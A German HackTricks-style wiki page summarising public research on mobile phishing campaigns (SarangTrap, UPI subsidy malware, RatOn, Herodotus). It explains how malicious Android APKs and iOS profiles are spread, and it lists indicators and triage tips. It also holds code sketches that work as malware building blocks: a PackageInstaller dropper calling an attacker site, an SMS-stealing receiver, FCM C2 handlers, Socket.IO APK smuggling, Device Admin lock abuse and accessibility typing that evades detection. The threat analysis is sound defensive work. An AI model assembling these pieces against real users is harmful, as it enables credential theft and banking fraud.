# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Diese Seite behandelt Techniken, die von threat actors verwendet werden, um **malicious Android APKs** und **iOS mobile-configuration profiles** durch phishing (SEO, social engineering, Fake-Stores, Dating-Apps usw.) zu verbreiten. Das Material basiert auf der SarangTrap-Kampagne, die von Zimperium zLabs (2025) aufgedeckt wurde, sowie auf weiterer öffentlicher Forschung.

## Angriffsablauf

1. **SEO/Phishing-Infrastruktur**
* Registriere Dutzende von Look‑alike‑Domains (Dating, cloud share, car service …).
– Verwende Stichwörter in der Landessprache und Emojis im `<title>`-Element, um in Google zu ranken.
– Stelle sowohl Android (`.apk`) als auch iOS-Installationsanweisungen auf derselben Landing Page bereit.
2. **Download der ersten Stufe**
* Android: direkter Link zu einer *nicht signierten* oder „Drittanbieter‑Store“-APK.
* iOS: `itms-services://` oder einfacher HTTPS-Link zu einem bösartigen **mobileconfig**-Profil (siehe unten).
3. **Post‑Install Social Engineering**
* Beim ersten Start fragt die App nach einem **Einladungs-/Verifizierungscode** (Illusion exklusiven Zugangs).
* Der Code wird per **HTTP POST** an das Command-and-Control (C2) gesendet.
* C2 antwortet `{"success":true}` ➜ Malware fährt fort.
* Sandbox-/AV-Dynamikanalysen, die niemals einen gültigen Code absenden, sehen **kein bösartiges Verhalten** (Evasion).
4. **Missbrauch von Laufzeit‑Berechtigungen (Android)**
* Dangerous permissions werden erst **nach positiver C2‑Antwort** angefragt:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Neuere Varianten **entfernen `<uses-permission>` für SMS aus `AndroidManifest.xml`**, belassen aber den Java/Kotlin‑Codepfad, der SMS per Reflection liest ⇒ senkt den statischen Score, bleibt jedoch auf Geräten funktionsfähig, die die Berechtigung via `AppOps`‑Missbrauch oder alte Targets gewähren.

5. **Android 13+ Restricted Settings & Dropper‑Bypass (SecuriDropper‑style)**
* Android 13 führte **Restricted settings** für sideloaded Apps ein: Die Toggles für Accessibility und Notification Listener sind ausgegraut, bis der Benutzer Restricted settings explizit in **App info** erlaubt.
* Phishing‑Seiten und Dropper liefern jetzt schrittweise UI‑Anweisungen, um für die sideloaded App die **Restricted settings zu erlauben** und anschließend Accessibility/Notification‑Zugriff zu aktivieren.
* Ein neuerer Bypass besteht darin, das Payload über einen **session‑based PackageInstaller flow** zu installieren (die gleiche Methode, die App‑Stores verwenden). Android behandelt die App dann als store‑installiert, sodass Restricted settings Accessibility nicht mehr blockiert.
* Triage‑Hinweis: In einem Dropper nach `PackageInstaller.createSession/openSession` suchen plus Code, der das Opfer sofort zu `ACTION_ACCESSIBILITY_SETTINGS` oder `ACTION_NOTIFICATION_LISTENER_SETTINGS` navigiert.

6. **Fassade UI & Hintergrunddatensammlung**
* Die App zeigt harmlose Views (SMS‑Viewer, Gallery‑Picker), lokal implementiert.
* Unterdessen exfiltriert sie:
- IMEI / IMSI, Telefonnummer
- Vollständigen `ContactsContract` Dump (JSON‑Array)
- JPEG/PNG aus `/sdcard/DCIM`, komprimiert mit [Luban](https://github.com/Curzibn/Luban) zur Größenreduktion
- Optionaler SMS‑Inhalt (`content://sms`)
Die Payloads werden **batch‑zipped** und per `HTTP POST /upload.php` gesendet.
7. **iOS‑Delivery‑Technik**
* Ein einzelnes **mobile-configuration profile** kann `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. anfordern, um das Gerät in eine „MDM“‑ähnliche Supervision einzuschreiben.
* Social‑Engineering‑Anweisungen:
1. Öffne Settings ➜ *Profile downloaded*.
2. Tippe dreimal auf *Install* (Screenshots auf der Phishing‑Seite).
3. Vertraue dem unsignierten Profil ➜ Angreifer erhält *Contacts* & *Photo* Entitlement ohne App‑Store‑Review.
8. **iOS Web Clip Payload (phishing App‑Icon)**
* `com.apple.webClip.managed` payloads können eine Phishing‑URL auf dem Home Screen pinnen mit gebrandetem Icon/Label.
* Web Clips können **full‑screen** laufen (verstecken die Browser‑UI) und als **non‑removable** markiert werden, sodass das Opfer das Profil löschen muss, um das Icon zu entfernen.
9. **Netzwerkebene**
* Klartext‑HTTP, oft Port 80 mit HOST‑Header wie `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (kein TLS → leicht erkennbar).

## Red‑Team‑Tipps

* **Dynamic Analysis Bypass** – Während der Malware‑Analyse die Einladungscode‑Phase mit Frida/Objection automatisieren, um den bösartigen Pfad zu erreichen.
* **Manifest vs. Runtime Diff** – Vergleiche `aapt dump permissions` mit Laufzeit‑`PackageManager#getRequestedPermissions()`; fehlende dangerous perms sind ein Warnsignal.
* **Network Canary** – Konfiguriere `iptables -p tcp --dport 80 -j NFQUEUE`, um ungewöhnliche POST‑Bursts nach Codeeingabe zu detektieren.
* **mobileconfig Inspection** – Verwende `security cms -D -i profile.mobileconfig` auf macOS, um `PayloadContent` aufzulisten und übermäßige Entitlements zu erkennen.

## Nützlicher Frida‑Snippet: Auto‑Bypass Invitation Code

<details>
<summary>Frida: Auto‑Bypass für Einladungscode</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatoren (Allgemein)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Dieses Pattern wurde in Kampagnen beobachtet, die Themen zu staatlichen Leistungen missbrauchen, um indische UPI-Zugangsdaten und OTPs zu stehlen. Operatoren verketten vertrauenswürdige Plattformen für Auslieferung und Resilienz.

### Delivery chain across trusted platforms
- YouTube video lure → Beschreibung enthält einen Shortlink
- Shortlink → GitHub Pages phishing site, die das legitime Portal imitiert
- Dasselbe GitHub-Repo enthält eine APK mit einem gefälschten “Google Play”-Badge, das direkt auf die Datei verlinkt
- Dynamische phishing-Seiten liegen auf Replit; der entfernte Befehlskanal nutzt Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Die erste APK ist ein Installer (dropper), der die eigentliche malware unter `assets/app.apk` ausliefert und den Nutzer auffordert, Wi‑Fi/mobile data zu deaktivieren, um Cloud-Erkennung zu unterlaufen.
- Die eingebettete payload installiert sich unter einer harmlos wirkenden Bezeichnung (z. B. “Secure Update”). Nach der Installation sind sowohl der Installer als auch das payload als separate apps vorhanden.

Statischer Triage‑Tipp (grep nach eingebetteten payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamische endpoint-Erkennung via shortlink
- Malware ruft von einem shortlink eine plain-text, comma-separated Liste von live endpoints ab; einfache string transforms erzeugen den finalen phishing page path.

Beispiel (bereinigt):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudocode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Der Schritt “Make payment of ₹1 / UPI‑Lite” lädt ein attacker HTML-Formular von einem dynamischen Endpoint innerhalb einer WebView und erfasst sensible Felder (Telefon, Bank, UPI PIN), die per `POST` an `addup.php` gesendet werden.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Beim ersten Start werden aggressive Berechtigungen angefordert:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte werden durchlaufen, um smishing SMS massenhaft vom Gerät des Opfers zu versenden.
- Eingehende SMS werden von einem broadcast receiver abgefangen und zusammen mit Metadaten (sender, body, SIM slot, per-device random ID) an `/addsm.php` hochgeladen.

Receiver-Skizze:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) als robustes C2
- Die Payload registriert sich bei FCM; Push-Nachrichten enthalten ein `_type`-Feld, das als Schalter verwendet wird, um Aktionen auszulösen (z. B. phishing text templates aktualisieren, Verhalten umschalten).

Beispiel FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-Skizze:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indikatoren/IOCs
- APK enthält sekundäre payload unter `assets/app.apk`
- WebView lädt payment von `gate.htm` und exfiltrates zu `/addup.php`
- SMS exfiltration zu `/addsm.php`
- Shortlink-driven config fetch (z. B. `rebrand.ly/*`) returning CSV endpoints
- Apps, die als generische “Update/Secure Update” gekennzeichnet sind
- FCM `data` messages mit einem `_type` discriminator in untrusted apps

---

## Socket.IO/WebSocket-basierte APK Smuggling + Fake Google Play Pages

Angreifer ersetzen zunehmend statische APK-Links durch einen Socket.IO/WebSocket-Channel, der in Google Play–ähnliche Köder eingebettet ist. Das verschleiert die payload URL, umgeht URL/extension filters und erhält ein realistisches Install-UX.

Typischer Client-Ablauf, in freier Wildbahn beobachtet:

<details>
<summary>Socket.IO gefälschter Play-Downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Warum es einfachen Kontrollen entgeht:
- Keine statische APK-URL wird offengelegt; der payload wird im Speicher aus WebSocket-Frames rekonstruiert.
- URL/MIME/Extension-Filter, die direkte .apk-Antworten blockieren, können binäre Daten, die über WebSockets/Socket.IO getunnelt werden, übersehen.
- Crawler und URL-Sandboxes, die WebSockets nicht ausführen, werden den payload nicht abrufen.

Siehe auch WebSocket tradecraft und tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn Fallstudie

Die RatOn banker/RAT-Kampagne (ThreatFabric) ist ein konkretes Beispiel dafür, wie moderne mobile Phishing-Operationen WebView dropper, Accessibility-gesteuerte UI-Automation, Overlays/ransom, Device Admin-Zwang, Automated Transfer System (ATS), crypto wallet takeover und sogar NFC-relay orchestration kombinieren. Dieser Abschnitt abstrahiert die wiederverwendbaren Techniken.

### Stage-1: WebView → native Installationsbrücke (dropper)
Angreifer präsentieren eine WebView, die auf eine vom Angreifer kontrollierte Seite zeigt, und injizieren eine JavaScript-Schnittstelle, die einen nativen Installer exponiert. Ein Tipp auf einen HTML-Button ruft nativen Code auf, der eine in den Assets des dropper gebündelte APK der zweiten Stufe installiert und diese dann direkt startet.

Minimales Muster:

<details>
<summary>Minimales Muster des Stage-1 dropper (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML auf der Seite:
```html
<button onclick="bridge.installApk()">Install</button>
```
Nach der Installation startet der dropper das payload über ein explizites package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting-Idee: nicht vertrauenswürdige Apps, die `addJavascriptInterface()` aufrufen und installer-ähnliche Methoden an WebView exponieren; APK, die eine eingebettete sekundäre Payload unter `assets/` ausliefert und die Package Installer Session API aufruft.

### Consent-Funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 öffnet eine WebView, die eine „Access“-Seite hostet. Ihr Button ruft eine exportierte Methode auf, die das Opfer zu den Accessibility-Einstellungen navigiert und das Aktivieren des bösartigen Dienstes anfragt. Sobald gewährt, verwendet die Malware Accessibility, um automatisch durch nachfolgende Runtime-Berechtigungsdialoge (contacts, overlay, manage system settings, etc.) zu klicken, und fordert Device Admin an.

- Accessibility hilft programmatisch, spätere Aufforderungen zu akzeptieren, indem Buttons wie „Allow“/„OK“ im Node-Tree gefunden und Klicks ausgelöst werden.
- Overlay-Berechtigungsprüfung/-anfrage:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Siehe auch:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatoren können Befehle ausgeben, um:
- ein Vollbild-Overlay von einer URL anzeigen oder
- inline HTML übergeben, das in einem WebView-Overlay geladen wird.

Wahrscheinliche Verwendungszwecke: Erpressung (PIN-Eingabe), Öffnen von Wallets, um PINs abzugreifen, Lösegeld-Nachrichten. Behalte einen Befehl bei, um sicherzustellen, dass die Overlay-Berechtigung gesetzt ist, falls sie fehlt.

### Fernsteuerungsmodell – text pseudo-screen + screen-cast
- Niedrige Bandbreite: periodisch den Accessibility-Node-Tree ausgeben, sichtbare Texte/Rollen/Bounds serialisieren und als Pseudo-Screen an C2 senden (Befehle wie `txt_screen` einmalig und `screen_live` kontinuierlich).
- Hohe Qualität: MediaProjection anfordern und bei Bedarf Screen-Casting/Aufzeichnung starten (Befehle wie `display` / `record`).

### ATS-Playbook (Bank-App-Automatisierung)
Für eine gegebene JSON-Aufgabe: öffne die Bank-App, steuere die UI über Accessibility mit einer Mischung aus Textabfragen und Koordinaten-Taps und gib die Zahlungs-PIN des Opfers ein, wenn sie abgefragt wird.

Beispielaufgabe:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Beispieltexte, gesehen in einem Ziel-Flow (CZ → EN):
- "Nová platba" → "Neue Zahlung"
- "Zadat platbu" → "Zahlung eingeben"
- "Nový příjemce" → "Neuer Empfänger"
- "Domácí číslo účtu" → "Inländische Kontonummer"
- "Další" → "Weiter"
- "Odeslat" → "Senden"
- "Ano, pokračovat" → "Ja, fortfahren"
- "Zaplatit" → "Bezahlen"
- "Hotovo" → "Fertig"

Operatoren können Überweisungsgrenzen auch prüfen/erhöhen über Befehle wie `check_limit` und `limit`, die ähnlich durch die Limits-UI navigieren.

### Seed-Extraktion von Crypto-Wallets
Ziele wie MetaMask, Trust Wallet, Blockchain.com, Phantom. Ablauf: entsperren (gestohlener PIN oder bereitgestelltes Passwort), zu Security/Recovery navigieren, seed phrase offenlegen/anzeigen, keylog/exfiltrate it. Implementiere lokalisierungsabhängige Selektoren (EN/RU/CZ/SK), um die Navigation über verschiedene Sprachen zu stabilisieren.

### Erzwingen von Device Admin-Rechten
Device Admin APIs werden verwendet, um Möglichkeiten zur PIN-Erfassung zu erhöhen und das Opfer zu frustrieren:

- Sofortige Sperre:
```java
dpm.lockNow();
```
- Aktuelles credential ablaufen lassen, um eine Änderung zu erzwingen (Accessibility erfasst neue PIN/Passwort):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Erzwinge Entsperrung ohne Biometrie, indem du die keyguard biometric features deaktivierst:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Hinweis: Viele DevicePolicyManager-Kontrollen erfordern Device Owner/Profile Owner auf aktuellen Android-Versionen; einige OEM-Builds können nachlässig sein. Immer auf dem Ziel-OS/OEM validieren.

### NFC-Relay-Orchestrierung (NFSkate)
Stage-3 kann ein externes NFC-relay-Modul (z. B. NFSkate) installieren und starten und ihm sogar eine HTML-Vorlage übergeben, die das Opfer während des Relay anleitet. Dadurch wird kontaktloses card-present cash-out neben online ATS ermöglicht.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator-Befehlssatz (Beispiel)
- UI/Zustand: `txt_screen`, `screen_live`, `display`, `record`
- Soziales: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Gerät: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikation/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-getriebene ATS-Anti-Detection: menschenähnliche Text-Kadenz und doppelte Texteinspeisung (Herodotus)

Bedrohungsakteure kombinieren zunehmend Accessibility-getriebene Automatisierung mit Anti-Detection, die gegen grundlegende Verhaltensbiometrie feinjustiert ist. Ein aktueller banker/RAT zeigt zwei komplementäre Text-Zustellmodi und einen Operator-Schalter, um menschenähnliches Tippen mit zufälliger Kadenz zu simulieren.

- Discovery-Modus: sichtbare nodes mit Selektoren und bounds auflisten, um Eingaben präzise anzusteuern (ID, text, contentDescription, hint, bounds), bevor gehandelt wird.
- Duale Texteinspeisung:
- Modus 1 – `ACTION_SET_TEXT` direkt auf dem Ziel-node (stabil, keine Tastatur);
- Modus 2 – Zwischenablage setzen + `ACTION_PASTE` in das fokussierte Feld (funktioniert, wenn direktes setText blockiert ist).
- Menschenähnliche Kadenz: den vom Operator gelieferten String aufteilen und ihn Zeichen für Zeichen mit randomisierten 300–3000 ms Verzögerungen zwischen den Ereignissen liefern, um „machine-speed typing“-Heuristiken zu umgehen. Implementiert entweder durch progressives Aufbauen des Wertes via `ACTION_SET_TEXT` oder durch Einfügen eines Zeichens nach dem anderen.

<details>
<summary>Java-Skizze: node discovery + verzögerte zeichenweise Eingabe via setText oder clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Abdeckende Overlays zur Betrugsverschleierung:
- Erzeuge ein Vollbild-`TYPE_ACCESSIBILITY_OVERLAY` mit vom Operator gesteuerter Deckkraft; halte es für das Opfer undurchsichtig, während darunter die Remote-Automatisierung abläuft.
- Typischerweise bereitgestellte Befehle: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimales Overlay mit einstellbarem Alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Häufig beobachtete Operator-Steuerungs-Primitive: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Referenzen

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
